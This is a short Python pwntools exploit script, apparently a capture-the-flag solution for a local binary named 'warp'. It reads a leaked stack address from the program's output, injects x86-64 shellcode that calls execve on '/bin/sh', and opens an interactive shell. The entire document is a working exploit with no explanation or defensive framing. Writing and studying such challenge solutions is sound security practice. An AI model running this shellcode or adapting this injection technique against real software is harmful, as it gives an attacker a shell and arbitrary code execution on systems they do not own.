from pwn import *

context.arch = "amd64"
p = process("./warp")

sc = asm("""
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
mov ax, 0x3b
syscall
""")

p.recvuntil(b"POSITION: ")
stack_leak = int(p.recvline(), 16)

p.sendline(hex(stack_leak + 8 + 15).encode() + b" " + sc)

p.interactive()
